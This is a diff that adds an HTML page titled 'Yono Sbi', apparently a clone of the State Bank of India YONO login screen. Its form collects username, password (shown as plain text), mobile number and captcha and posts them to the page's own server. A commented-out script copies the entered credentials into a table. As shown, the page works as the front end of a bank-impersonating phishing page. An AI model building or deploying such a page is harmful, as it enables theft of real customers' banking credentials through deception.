@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Yono Sbi</title>
+    <!-- Font Awesome Icon (fa class)-->
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"
+    />
+
+    <style>
+      @import url("https://fonts.googleapis.com/css2?family=Fredoka:wght@300;500&display=swap");
+      * {
+        margin: 0;
+        padding: 0;
+        block-size: border-box;
+      }
+
+      body {
+        font-family: "Fredoka", sans-serif;
+      }
+
+      ul,
+      li {
+        list-style: none;
+      }
+
+      .form_sec,
+      .form_outer {
+        display: grid;
+        place-content: center;
+        background-color: #fff;
+        /* margin: 50px 0; */
+      }
+
+      .form_outer {
+        width: 450px;
+        background-color: rgb(183, 31, 82);
+        padding: 40px 0;
+      }
+
+      form {
+        width: 300px;
+        height: auto;
+        background-color: #fff;
+        padding: 25px 40px;
+        border-radius: 15px;
+      }
+
+      h1 {
+        font-size: 43px;
+        padding: 10px 3px;
+        line-height: 55px;
+      }
+
+      h1 img {
+        width: 100%;
+        margin-top: 10px;
+      }
+
+      .color_chnge {
+        background: -webkit-linear-gradient(
+          rgb(177, 25, 82),
+          rgb(82, 9, 99),
+          rgb(41, 0, 116)
+        );
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+      }
+
+      span {
+        font-family: Arial, Helvetica, sans-serif;
+      }
+
+      input {
+        border: 0;
+        width: 100%;
+        background-color: transparent;
+        border-bottom: 2px solid rgb(233, 233, 233);
+        padding-bottom: 13px;
+        padding-left: 10px;
+        margin-bottom: 15px;
+      }
+
+      input::placeholder {
+        color: #787878;
+      }
+
+      input:hover {
+        color: #000;
+      }
+
+      input:focus {
+        outline: none;
+      }
+
+      .check_box {
+        display: flex;
+      }
+
+      .check_box input {
+        padding-bottom: 0;
+        padding-left: 0;
+        margin-bottom: 0;
+      }
+
+      .checked {
+        display: flex;
+        padding: 0;
+        margin: 0;
+        margin-top: 10px;
+        margin-bottom: 23px;
+      }
+
+      .checked input {
+        padding: 0;
+        margin: 0;
+        display: table;
+        width: 20px;
+        height: 14px;
+      }
+
+      .checkbox {
+        background-color: red;
+      }
+
+      .captcha p {
+        margin: 10px 0;
+      }
+
+      #captcha {
+        display: flex;
+      }
+
+      #captcha img {
+        width: 71%;
+        height: 55px;
+      }
+
+      #captcha .captcha_icon {
+        width: 36px;
+        height: 34px;
+        margin-left: 10px;
+        margin-top: 10px;
+        border-radius: 6px;
+
+        background-color: rgb(206, 181, 211);
+      }
+
+      #captcha i {
+        border-radius: 6px;
+        font-size: 17px;
+        text-align: center;
+        padding: 9.6px 10px;
+        font-weight: 100;
+      }
+
+      button {
+        width: 100%;
+        height: 40px;
+        margin: 23px 0;
+        border: 0;
+        background-color: rgb(102, 51, 144);
+        color: #fff;
+      }
+
+      table {
+        margin-top: 50px;
+        text-align: center;
+        background: #333;
+        color: #fff;
+      }
+
+      #show,
+      #show {
+        padding: 13px;
+      }
+
+      #btna td input {
+        width: 100%;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="form_sec">
+      <div class="form_outer">
+        <form action="/" method="POST">
+          <h1>
+            <span>Welcome to</span>
+            <img src="images/yimg.png" alt="" />
+          </h1>
+
+          <input type="text" name="name" id="name" placeholder="Username" />
+          <input type="text" name="pass" id="pass" placeholder="Password" />
+          <input type="text" name="mobile" id="mobile" placeholder="Mobile" />
+          <input
+            type="text"
+            name="captcha"
+            id="captcha"
+            placeholder="Enter the text as shown in the image"
+          />
+
+          <div class="checked">
+            <input type="checkbox" id="scales" name="scales" class="checkbox" />
+            <Span>Enable Virtual Keyboard</Span>
+          </div>
+
+          <div class="captcha">
+            <p>captcha</p>
+
+            <span id="captcha">
+              <img src="images/img.jpeg" alt="" />
+              <span class="captcha_icon"
+                ><i class="fa fa-refresh" aria-hidden="true"></i
+              ></span>
+            </span>
+          </div>
+
+          <button type="submit" value="Add" onclick="AddRow()">LOG IN</button>
+          <!-- <tr id="btna">
+                        <td colspan="2"><input type="button" name="button" id="btn" value="Add" onclick="AddRow()"></td>
+                    </tr> -->
+        </form>
+      </div>
+    </div>
+
+    <img
+      src="../orlank_tech/WhatsApp Image 2022-03-11 at 1.24.01 PM.jpeg"
+      alt=""
+    />
+
+    <!-- <center>
+	<table border="4" id="show">
+        <thead>
+            <tr>
+                <th>Name</th>
+                <th>Password</th>
+                <th>Mobile</th>
+                <th>Captcha</th>
+            </tr>
+        </thead>
+    </table>
+
+</center>
+
+    <script>
+		
+		var list1 = [];
+		var list2 = [];
+		var list3 = [];
+		var list4 = [];
+
+		var n = 1;
+		var x = 0;
+
+		function AddRow(){
+
+			var AddRown = document.getElementById('show');
+			var NewRow = AddRown.insertRow(n);
+
+			list1[x] = document.getElementById("name").value;
+			list2[x] = document.getElementById("pass").value;
+			list3[x] = document.getElementById("mobile").value;
+			list4[x] = document.getElementById("captcha").value;
+
+			var cel1 = NewRow.insertCell(0);
+			var cel2 = NewRow.insertCell(1);
+			var cel3 = NewRow.insertCell(2);
+			var cel4 = NewRow.insertCell(3);
+
+			cel1.innerHTML = list1[x];
+			cel2.innerHTML = list2[x];
+			cel3.innerHTML = list3[x];
+			cel4.innerHTML = list4[x];
+
+			n++;
+			x++;
+		}
+
+	</script> -->
+  </body>
+</html>
